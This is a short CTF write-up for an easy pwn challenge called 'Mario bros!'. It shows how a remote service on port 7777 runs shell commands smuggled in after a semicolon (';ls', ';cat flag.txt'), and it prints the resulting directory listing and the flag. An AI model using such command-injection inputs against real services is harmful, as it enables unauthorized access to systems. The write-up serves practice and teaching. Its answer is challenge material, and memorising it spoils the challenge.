# EZ CTF

## Pwn

### Mario bros!

**Difficulty:** Easy

**Statement:** Read the flag!  

***

For this challenge, you need to connect to the remote server on port 7777.

Once connected, we are on a shell with the return command `Are you root?

Sending a single value or command closes the shell and the connection to the server.

So I'm just trying to add a `;` to inject a command: `;ls`

```
entrypoint.sh
flag.txt
pwn.sh
ucspi-tcp-0.88
ucspi-tcp-0.88.errno.patch
ucspi-tcp-0.88.tar.gz
```

I just have to read the content of the file **flag.txt**: `;cat flag.txt`

```
EZ-CTF{UNSECUR3_B4SH}
```

Flag: EZ-CTF{UNSECUR3_B4SH}
